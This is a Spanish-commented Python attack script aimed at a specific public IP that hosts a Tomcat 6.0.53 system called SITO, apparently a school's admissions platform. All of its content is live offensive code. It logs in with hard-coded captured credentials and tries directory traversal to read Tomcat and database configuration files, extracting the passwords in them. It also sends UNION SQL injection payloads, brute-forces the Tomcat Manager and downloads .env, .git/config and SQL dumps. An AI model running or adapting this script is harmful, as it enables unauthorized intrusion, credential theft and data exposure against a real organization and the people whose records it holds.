import requests
import base64
import xml.etree.ElementTree as ET
from urllib3.exceptions import InsecureRequestWarning

# Desactivar warnings de SSL
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

TARGET = "https://189.254.143.102"
SESSION = requests.Session()
SESSION.verify = False

# Credenciales encontradas
CREDS = {"xUsuario": "hnieto", "xContrasena": "utslp"}

def login_sito():
    """Iniciar sesión en SITO con credenciales conocidas"""
    print("[+] Iniciando sesión en SITO...")
    login_url = f"{TARGET}/jsp/index.jsp"
    
    # Obtener página de login primero
    resp = SESSION.get(login_url)
    
    # Enviar credenciales (simulando formulario)
    login_data = {
        "yAccion": "login",
        "yUsuario": "",
        "yIntentos": "1",
        "xUsuario": CREDS["xUsuario"],
        "xContrasena": CREDS["xContrasena"]
    }
    
    resp = SESSION.post(login_url, data=login_data)
    
    if "cerrar_sesion" in resp.text:
        print("✅ Login exitoso")
        return True
    else:
        print("❌ Login fallido")
        return False

def directory_traversal_exploit():
    """Explotar Directory Traversal en ejemplos de Tomcat"""
    print("\n[+] Explotando Directory Traversal...")
    
    # Archivos críticos a buscar
    critical_files = [
        "../../../../conf/tomcat-users.xml",
        "../../../../conf/server.xml",
        "../../../../logs/catalina.out",
        "../../../../webapps/manager/WEB-INF/web.xml",
        "../../../../webapps/SITO/WEB-INF/web.xml",
        "../../../../webapps/SITO/META-INF/context.xml",
        "WEB-INF/web.xml",
        "META-INF/context.xml"
    ]
    
    # Vectores de ataque conocidos
    endpoints = [
        "/examples/jsp/include/include.jsp?page=",
        "/examples/jsp/cal/cal2.jsp?time=",
        "/examples/jsp/snp/snoop.jsp?param=",
        "/examples/servlets/servlet/SnoopServlet?query="
    ]
    
    for endpoint in endpoints:
        print(f"\n🔍 Probando endpoint: {endpoint}")
        for file_path in critical_files:
            url = f"{TARGET}{endpoint}{file_path}"
            resp = SESSION.get(url)
            
            if resp.status_code == 200 and len(resp.content) > 1000:
                print(f"✅ POSIBLE ÉXITO: {file_path}")
                print(f"   Tamaño: {len(resp.content)} bytes")
                
                # Guardar contenido interesante
                if "tomcat-users" in file_path or "server.xml" in file_path or "web.xml" in file_path:
                    filename = file_path.split("/")[-1]
                    with open(filename, "w", encoding="utf-8") as f:
                        f.write(resp.text)
                    print(f"   📁 Guardado como: {filename}")
                    
                    # Analizar contenido
                    analyze_config_file(filename, resp.text)

def analyze_config_file(filename, content):
    """Analizar archivos de configuración encontrados"""
    print(f"\n[🔍] Analizando {filename}...")
    
    if "tomcat-users.xml" in filename:
        try:
            root = ET.fromstring(content)
            for user in root.findall(".//user"):
                username = user.get("username")
                password = user.get("password")
                roles = user.get("roles")
                print(f"   👤 Usuario: {username}")
                print(f"   🔑 Password: {password}")
                print(f"   🎯 Roles: {roles}")
                print("   " + "="*50)
        except:
            print("   ❌ No se pudo parsear XML")
    
    elif "web.xml" in filename or "context.xml" in filename:
        # Buscar credenciales de BD
        import re
        db_patterns = [
            r"jdbc:mysql://([^']+)",
            r"username=\"([^\"]+)\"",
            r"password=\"([^\"]+)\"",
            r"jdbc:([^:]+):",
            r"driverClassName=\"([^\"]+)\""
        ]
        
        for pattern in db_patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            if matches:
                print(f"   🔍 {pattern}: {matches}")

def exploit_ajax_endpoints():
    """Explotar endpoints AJAX descubiertos"""
    print("\n[+] Explotando endpoints AJAX...")
    
    ajax_endpoints = [
        "/jsp/escolar/proceso_admision/muestra_bachillerato_ajax.jsp?xCveBachillerato=",
        "/jsp/escolar/muestra_bachillerato_ajax.jsp?xCveBachillerato="
    ]
    
    # Payloads para extraer información de BD
    sql_payloads = [
        "1 UNION SELECT user(),database(),version()--",
        "1 UNION SELECT table_name,table_schema,3 FROM information_schema.tables--",
        "1 UNION SELECT @@version,@@hostname,@@datadir--",
        "1' AND 1=CAST((SELECT version()) AS INT)--"
    ]
    
    for endpoint in ajax_endpoints:
        print(f"\n🔍 Probando: {endpoint}")
        
        # Request normal para comparar
        normal_resp = SESSION.get(f"{TARGET}{endpoint}1")
        print(f"   Normal: {len(normal_resp.content)} bytes")
        
        for payload in sql_payloads:
            test_url = f"{TARGET}{endpoint}{payload}"
            resp = SESSION.get(test_url)
            
            if resp.status_code == 200 and len(resp.content) != len(normal_resp.content):
                print(f"   ✅ Diferencia con payload: {payload}")
                print(f"      Tamaño: {len(resp.content)} bytes")
                
                # Buscar datos interesantes en la respuesta
                interesting_keywords = ["root", "localhost", "mysql", "database", "table", "user"]
                for keyword in interesting_keywords:
                    if keyword in resp.text.lower():
                        print(f"      🔍 Encontrado: {keyword}")

def brute_force_tomcat_manager():
    """Fuerza bruta mejorada para Tomcat Manager"""
    print("\n[+] Fuerza bruta Tomcat Manager...")
    
    # Combinaciones basadas en hallazgos
    combinations = [
        ("hnieto", "utslp"),
        ("hnieto", "admin"),
        ("admin", "utslp"),
        ("tomcat", "utslp"),
        ("manager", "utslp"),
        ("hnieto", "tomcat"),
        ("hnieto", "manager"),
        ("sito", "sito"),
        ("sito", "utslp"),
        ("utslp", "utslp"),
    ]
    
    manager_url = f"{TARGET}/manager/html"
    
    for username, password in combinations:
        resp = SESSION.get(manager_url, auth=(username, password))
        if resp.status_code == 200 and "Tomcat Web Application Manager" in resp.text:
            print(f"✅ CREDENCIALES ENCONTRADAS: {username}:{password}")
            return True
    
    print("❌ No se encontraron credenciales válidas")
    return False

def search_sensitive_files():
    """Buscar archivos sensibles en rutas comunes"""
    print("\n[+] Buscando archivos sensibles...")
    
    sensitive_paths = [
        "/WEB-INF/web.xml",
        "/META-INF/context.xml",
        "/config.properties",
        "/application.properties",
        "/database.properties",
        "/.env",
        "/.git/config",
        "/backup.zip",
        "/dump.sql",
        "/tomcat-users.xml.backup"
    ]
    
    for path in sensitive_paths:
        url = f"{TARGET}{path}"
        resp = SESSION.get(url)
        if resp.status_code == 200:
            print(f"✅ Archivo encontrado: {path}")
            print(f"   Tamaño: {len(resp.content)} bytes")
            
            # Guardar archivo interesante
            if resp.content and len(resp.content) > 10:
                filename = path.replace("/", "_")
                with open(f"found_{filename}", "wb") as f:
                    f.write(resp.content)
                print(f"   📁 Guardado como: found_{filename}")

def main():
    print("🔍 EXPLORADOR AVANZADO TOMCAT 6.0.53")
    print("="*50)
    
    # 1. Login con credenciales conocidas
    if login_sito():
        # 2. Buscar archivos de configuración
        directory_traversal_exploit()
        
        # 3. Explotar endpoints AJAX
        exploit_ajax_endpoints()
        
        # 4. Buscar archivos sensibles
        search_sensitive_files()
        
        # 5. Fuerza bruta Tomcat Manager
        brute_force_tomcat_manager()
    else:
        print("❌ No se pudo continuar sin sesión activa")

if __name__ == "__main__":
    main()